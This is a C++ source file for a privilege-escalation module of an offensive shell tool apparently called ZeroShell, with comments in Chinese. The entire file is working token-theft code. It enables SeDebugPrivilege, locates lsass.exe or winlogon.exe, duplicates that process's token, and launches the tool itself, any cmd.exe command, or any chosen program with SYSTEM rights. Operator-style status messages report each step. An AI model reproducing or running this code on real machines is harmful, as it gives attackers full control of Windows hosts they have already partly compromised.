#include "system_token_module.h"

#include <iostream>
#include <windows.h>
#include <tlhelp32.h>
#include <sstream>

std::vector<std::string> SystemTokenModule::getCommands() const {
    return { "get-system", "get-system-cmd", "get-system-run" };
}

bool SystemTokenModule::execute(const std::string& cmd, const std::vector<std::string>& args) {
    if (cmd == "get-system") {
        // 以 SYSTEM 权限启动 ZeroShell 自身
        char exePath[MAX_PATH];
        GetModuleFileNameA(NULL, exePath, MAX_PATH);
        std::string command = std::string("\"") + exePath + "\"";
        return stealSystemToken(command, true);
    }

    if (cmd == "get-system-cmd") {
        if (args.empty()) {
            std::cout << "Usage: system-cmd <command>\n";
            std::cout << "  Example: system-cmd whoami /priv\n";
            return true;
        }
        std::string command = "cmd.exe /c " + args[0];
        for (size_t i = 1; i < args.size(); ++i)
            command += " " + args[i];
        return stealSystemToken(command);
    }

    if (cmd == "get-system-run") {
        if (args.empty()) {
            std::cout << "Usage: get-system-run <program> [args...]\n";
            std::cout << "  Example: get-system-run notepad.exe\n";
            return true;
        }
        std::string command = args[0];
        for (size_t i = 1; i < args.size(); ++i)
            command += " \"" + args[i] + "\"";
        return stealSystemToken(command);
    }

    return false;
}

bool SystemTokenModule::stealSystemToken(const std::string& command, bool exitAfter) {
    // 1. 提权到 SeDebugPrivilege
    HANDLE hToken;
    LUID luid;
    TOKEN_PRIVILEGES tp;

    std::cout << "[*] Enabling SeDebugPrivilege...\n";
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        std::cerr << "[-] OpenProcessToken failed. Error: " << GetLastError() << "\n";
        return true;
    }

    if (!LookupPrivilegeValueW(NULL, SE_DEBUG_NAME, &luid)) {
        std::cerr << "[-] LookupPrivilegeValue failed. Error: " << GetLastError() << "\n";
        CloseHandle(hToken);
        return true;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL)) {
        std::cerr << "[-] AdjustTokenPrivileges failed. Error: " << GetLastError() << "\n";
        CloseHandle(hToken);
        return true;
    }
    CloseHandle(hToken);
    std::cout << "[+] SeDebugPrivilege enabled.\n";

    // 2. 枚举进程，找 lsass.exe 和 winlogon.exe
    std::cout << "[*] Scanning processes for lsass.exe / winlogon.exe...\n";

    DWORD pidL = 0, pidW = 0;
    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(PROCESSENTRY32);

    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        std::cerr << "[-] CreateToolhelp32Snapshot failed. Error: " << GetLastError() << "\n";
        return true;
    }

    if (Process32First(hSnapshot, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, L"lsass.exe") == 0) {
                pidL = pe.th32ProcessID;
            } else if (_wcsicmp(pe.szExeFile, L"winlogon.exe") == 0) {
                pidW = pe.th32ProcessID;
            }
        } while (Process32Next(hSnapshot, &pe));
    }
    CloseHandle(hSnapshot);

    if (pidL == 0 && pidW == 0) {
        std::cerr << "[-] Failed to find lsass.exe or winlogon.exe.\n";
        return true;
    }

    // 3. 打开系统进程句柄
    DWORD targetPid = pidL ? pidL : pidW;
    const char* targetName = pidL ? "lsass.exe" : "winlogon.exe";
    std::cout << "[*] Found " << targetName << " (PID: " << targetPid << ")\n";
    std::cout << "[*] Opening process handle...\n";

    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, targetPid);
    if (!hProcess && pidL && pidW) {
        // lsass 失败，尝试 winlogon
        std::cout << "[*] lsass.exe failed, trying winlogon.exe...\n";
        hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pidW);
        targetName = "winlogon.exe";
    }
    if (!hProcess) {
        std::cerr << "[-] OpenProcess failed. Error: " << GetLastError() << "\n";
        std::cerr << "[-] Try running as Administrator first.\n";
        return true;
    }

    // 4. 获取并复制令牌
    std::cout << "[*] Opening process token...\n";
    HANDLE hTokenSys;
    if (!OpenProcessToken(hProcess, TOKEN_DUPLICATE, &hTokenSys)) {
        std::cerr << "[-] OpenProcessToken failed. Error: " << GetLastError() << "\n";
        CloseHandle(hProcess);
        return true;
    }

    std::cout << "[*] Duplicating token...\n";
    HANDLE hDupToken;
    if (!DuplicateTokenEx(hTokenSys, MAXIMUM_ALLOWED, NULL,
                           SecurityImpersonation, TokenPrimary, &hDupToken)) {
        // Try SecurityIdentification as fallback
        if (!DuplicateTokenEx(hTokenSys, MAXIMUM_ALLOWED, NULL,
                               SecurityIdentification, TokenPrimary, &hDupToken)) {
            std::cerr << "[-] DuplicateTokenEx failed. Error: " << GetLastError() << "\n";
            CloseHandle(hTokenSys);
            CloseHandle(hProcess);
            return true;
        }
    }
    CloseHandle(hTokenSys);
    CloseHandle(hProcess);
    std::cout << "[+] Token duplicated.\n";

    // 5. 以 SYSTEM 令牌启动进程
    std::cout << "[*] Launching with SYSTEM token...\n";

    STARTUPINFOW si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(STARTUPINFOW));
    ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
    si.cb = sizeof(STARTUPINFOW);
    si.lpDesktop = (LPWSTR)L"winsta0\\default";

    // 宽字符转换
    int wideLen = MultiByteToWideChar(CP_UTF8, 0, command.c_str(), -1, NULL, 0);
    std::wstring wCommand(wideLen, L'\0');
    MultiByteToWideChar(CP_UTF8, 0, command.c_str(), -1, &wCommand[0], wideLen);

    if (CreateProcessWithTokenW(hDupToken, 0, NULL, &wCommand[0],
                                  NORMAL_PRIORITY_CLASS, NULL, NULL, &si, &pi)) {
        std::cout << "[+] Process launched with SYSTEM token (PID: " << pi.dwProcessId << ")\n";
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    } else {
        DWORD err = GetLastError();
        std::cerr << "[-] CreateProcessWithTokenW failed. Error: " << err << "\n";

        // 尝试用 CreateProcessAsUserW 作为备选
        std::cout << "[*] Trying CreateProcessAsUserW...\n";
        if (CreateProcessAsUserW(hDupToken, NULL, &wCommand[0],
                                   NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
            std::cout << "[+] Process launched with SYSTEM token (PID: " << pi.dwProcessId << ")\n";
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
        } else {
            std::cerr << "[-] CreateProcessAsUserW also failed. Error: " << GetLastError() << "\n";
        }
    }

    CloseHandle(hDupToken);
    std::cout << "[+] Done.\n";
    if (exitAfter) exit(0);
    return true;
}